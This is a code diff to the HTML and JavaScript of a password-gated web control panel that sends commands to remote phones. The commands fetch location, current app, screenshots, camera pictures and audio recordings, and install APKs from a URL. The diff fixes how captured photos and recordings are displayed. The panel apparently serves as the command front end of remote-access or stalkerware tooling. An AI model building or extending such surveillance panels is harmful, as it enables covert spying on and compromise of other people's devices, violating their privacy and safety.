@@ -351,62 +351,93 @@
         }
         
         function startAnimationLoop(){animationFrameId&&cancelAnimationFrame(animationFrameId);const e=()=>{animationFrameId=requestAnimationFrame(e),controls.update(),renderer.render(scene,camera)};e()}function stopAnimationLoop(){animationFrameId&&(cancelAnimationFrame(animationFrameId),animationFrameId=null),window.removeEventListener("resize",onWindowResize)}function onWindowResize(){const e=document.getElementById("visualizer");e&&camera&&renderer&&(camera.aspect=e.clientWidth/e.clientHeight,camera.updateProjectionMatrix(),renderer.setSize(e.clientWidth,e.clientHeight))}function switchTab(e){document.querySelectorAll(".tab-content").forEach(e=>e.classList.remove("active")),document.querySelectorAll(".tab").forEach(e=>e.classList.remove("active")),document.getElementById(e).classList.add("active"),document.querySelector(`.tab[onclick="switchTab('${e}')"]`).classList.add("active")}function checkUiPassword(){document.getElementById("ui-password-input").value===UI_UNLOCK_PASSWORD?(sessionStorage.setItem("isAuthenticated","true"),isAuthenticated=!0,showAdminPanel()):alert("Incorrect password! Please try again.")}function showAdminPanel(){document.getElementById("password-view").style.display="none",document.getElementById("admin-panel-view").style.display="block",document.getElementById("device-dropdown").options.length<=1&&(populateDropdown("device-dropdown",DEVICES_JSON_URL,"Device"),populateDropdown("action-dropdown",COMMANDS_JSON_URL,"Command"))}async function populateDropdown(e,t,o){const n=document.getElementById(e);try{const a=await fetch(t);if(!a.ok)throw new Error(`Failed to fetch ${o}s`);const i=await a.json();n.innerHTML="",n.add(new Option(`-- Select a ${o} --`,"")),i.forEach(e=>{n.add(new Option(e.name||e.value,e.id||e.value,!1,e.disabled))})}catch(a){console.error(`Error loading ${o}s:`,a),n.innerHTML=`<option value="">-- Error Loading ${o}s --</option>`}}function showModal(e){document.getElementById(e).style.display="flex",e==="visualizer-modal"&&!animationFrameId&&(void 0!==THREE&&void 0!==THREE.OrbitControls?initVisualizer():document.getElementById("visualizer").innerHTML='<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D visualization library failed to load.</p>')}function hideModal(e){"visualizer-modal"===e&&stopAnimationLoop(),document.getElementById(e).style.display="none"}function onDeviceSelected(){["data-screen","data-battery","data-charging","data-location","data-current-app","data-proximity","data-light"].forEach(e=>safeUpdateElement(e,"--")),document.getElementById("visualize-btn").disabled=!0,updateStatusLog("New device selected. Click 'Refresh Data' to fetch its status.","info")}async function forceRefresh(){const e=document.getElementById("refresh-btn"),t=document.getElementById("refresh-text"),o=document.getElementById("refresh-spinner");e.disabled=!0,t.textContent="Refreshing...",o.style.display="inline-block",await fetchLatestData(),e.disabled=!1,t.textContent="Refresh Data",o.style.display="none"}async function fetchLatestData(){const e=document.getElementById("device-dropdown").value;if(!e)return void updateStatusLog("Please select a device first.","error");try{const t=await fetch(`/.netlify/functions/get-status?deviceId=${e}`);if(404===t.status)return void updateStatusLog("No data found for this device yet. Send a command to initialize it.","warning");if(!t.ok)throw new Error(`Server error: ${t.status}`);const o=await t.json();parseAndDisplayData(o),updateStatusLog("Device data refreshed successfully.","success")}catch(t){console.error("Data fetch failed:",t),updateStatusLog("Failed to fetch device data: "+t.message,"error")}}
-        function parseAndDisplayData(allData) {
-            let hasSensorData = false;
-            onDeviceSelected();
-            for (const key in allData) {
-                const payload = allData[key]?.payload;
-                if (!payload) continue;
-                
-                try {
-                    switch(key) {
-                        case "screen_status": safeUpdateElement("data-screen", payload || "N/A"); break;
-                        case "battery_status":
-                            if (payload?.percentage !== undefined) {
-                                safeUpdateElement("data-battery", `${payload.percentage.toFixed(0)}%`);
-                                safeUpdateElement("data-charging", payload.isCharging ? "✅ Charging" : "❌ Not Charging");
-                            }
-                            break;
-                        case "location": payload?.latitude ? safeUpdateElement("data-location", `${`${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}`}`) : safeUpdateElement("data-location", payload || "N/A"); break;
-                        case "current_app": safeUpdateElement("data-current-app", payload || "N/A"); break;
-                        case "proximity": if (payload?.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`); hasSensorData = true; break;
-                        case "light": if (payload?.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`); hasSensorData = true; break;
-                        case "screenshot":
-                             document.getElementById('image-modal-title').textContent = "Screenshot";
-                             document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
-                             showModal('image-modal');
-                             break;
-                        case "picture":
-                             document.getElementById('image-modal-title').textContent = "Camera Picture";
-                             document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
-                             showModal('image-modal');
-                             break;
-                        case "last_recording":
-                             const playerContainer = document.getElementById('data-recording-player');
-                             const recordingValue = document.getElementById('data-recording');
-                             playerContainer.innerHTML = ''; // Clear any old player
+        // In index.html, inside the <script> tag
 
-                             if (payload) {
-                                 const audio = document.createElement('audio');
-                                 audio.controls = true;
-                                 audio.src = `data:audio/mp3;base64,${payload}`;
-                                 playerContainer.appendChild(audio);
-                                 recordingValue.textContent = "New recording received.";
-                             } else {
-                                 recordingValue.textContent = "--";
-                             }
-                             break;
-                        default: if (["rotation_vector", "gravity", "magnetometer"].includes(key)) hasSensorData = true; break;
-                    }
-                } catch(e) { console.error(`Error processing display data for ${key}:`, e); }
-            }
-            if(hasSensorData) {
-                document.getElementById("visualize-btn").disabled = false;
-                const sensorPayload = {};
-                for(const key in allData) sensorPayload[key] = allData[key].payload;
-                analyzeAndSetPosition(sensorPayload);
-            }
+function parseAndDisplayData(allData) {
+    let hasSensorData = false;
+    // onDeviceSelected(); // This was resetting the UI too early. Moved reset logic inside loop.
+
+    for (const key in allData) {
+        // --- THIS IS THE CRITICAL FIX ---
+        // Check if the key is for a media file.
+        const isMediaKey = ["screenshot", "picture", "last_recording"].includes(key);
+        
+        // If it's a media key, the data itself is the payload.
+        // Otherwise, get the payload from inside the object.
+        const payload = isMediaKey ? allData[key] : allData[key]?.payload;
+
+        if (!payload) {
+            // If there's no payload for this key, skip to the next one.
+            continue;
         }
+        
+        try {
+            switch(key) {
+                case "screen_status":
+                    safeUpdateElement("data-screen", payload || "N/A");
+                    break;
+                case "battery_status":
+                    if (payload?.percentage !== undefined) {
+                        safeUpdateElement("data-battery", `${payload.percentage.toFixed(0)}%`);
+                        safeUpdateElement("data-charging", payload.isCharging ? "✅ Charging" : "❌ Not Charging");
+                    }
+                    break;
+                case "location":
+                    payload?.latitude ? safeUpdateElement("data-location", `${`${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}`}`) : safeUpdateElement("data-location", payload || "N/A");
+                    break;
+                case "current_app":
+                    safeUpdateElement("data-current-app", payload || "N/A");
+                    break;
+                case "proximity":
+                    if (payload?.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`);
+                    hasSensorData = true;
+                    break;
+                case "light":
+                    if (payload?.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`);
+                    hasSensorData = true;
+                    break;
+                case "screenshot":
+                     document.getElementById('image-modal-title').textContent = "Screenshot";
+                     // The payload is already the correct Base64 string because of our fix above.
+                     document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
+                     showModal('image-modal');
+                     break;
+                case "picture":
+                     document.getElementById('image-modal-title').textContent = "Camera Picture";
+                     // The payload is already the correct Base64 string.
+                     document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
+                     showModal('image-modal');
+                     break;
+                case "last_recording":
+                     const playerContainer = document.getElementById('data-recording-player');
+                     const recordingValue = document.getElementById('data-recording');
+                     playerContainer.innerHTML = ''; // Clear any old player
+
+                     // The payload is already the correct Base64 string.
+                     const audio = document.createElement('audio');
+                     audio.controls = true;
+                     audio.src = `data:audio/mp3;base64,${payload}`;
+                     playerContainer.appendChild(audio);
+                     recordingValue.textContent = "New recording ready to play.";
+                     break;
+                default:
+                    // This logic is for the orientation visualizer
+                    if (["rotation_vector", "gravity", "magnetometer"].includes(key)) hasSensorData = true;
+                    break;
+            }
+        } catch(e) { console.error(`Error processing display data for ${key}:`, e); }
+    }
+
+    if(hasSensorData) {
+        document.getElementById("visualize-btn").disabled = false;
+        const sensorPayload = {};
+        for(const key in allData) {
+             const isMediaKey = ["screenshot", "picture", "last_recording"].includes(key);
+             sensorPayload[key] = isMediaKey ? allData[key] : allData[key]?.payload;
+        }
+        analyzeAndSetPosition(sensorPayload);
+    }
+}
         function safeUpdateElement(e,t){const o=document.getElementById(e);o&&(o.textContent=t)}async function sendCommandWithValue(e,t={}){const o=document.getElementById("device-dropdown").value,n=document.getElementById("backend-password").value,a=document.getElementById("send-button");if(!o||!e||!n)return updateStatusLog("Error: Device, Action, and Password are required.","error");const i=a.innerHTML;a.disabled=!0,a.innerHTML='<span class="loading-spinner"></span> Sending...';try{const d=await fetch("/.netlify/functions/send-command",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({deviceId:o,action:e,password:n,...t})}),s=await d.json();d.ok?(updateStatusLog(`✅ Success: ${s.message}`,"success"),(e.startsWith("get_")||e.startsWith("take_")||"list_apps"===e)&&setTimeout(()=>forceRefresh(),2e3)):updateStatusLog(`❌ Error: ${s.error||"Unknown server error"}`,"error")}catch(d){updateStatusLog("❌ Network Error: Could not reach the command function.","error")}finally{a.disabled=!1,a.innerHTML=i}}function sendCommandFromDropdown(){const e=document.getElementById("action-dropdown").value;sendCommandWithValue(e)}function playSound(){const e=document.getElementById("sound-url-input").value;e?sendCommandWithValue("play_sound",{url:e}):updateStatusLog("Please enter a sound URL.","error")}function showImage(){const e=document.getElementById("image-url-input").value;e?sendCommandWithValue("show_image",{url:e}):updateStatusLog("Please enter an image URL.","error")}
         function setVolume() { const e=document.getElementById("volume-slider").value;sendCommandWithValue("set_volume",{level:e}) }
         function installApp() { const e=document.getElementById("app-url-input").value;e?sendCommandWithValue("install_app",{url:e}):updateStatusLog("Please enter an APK URL.","error") }
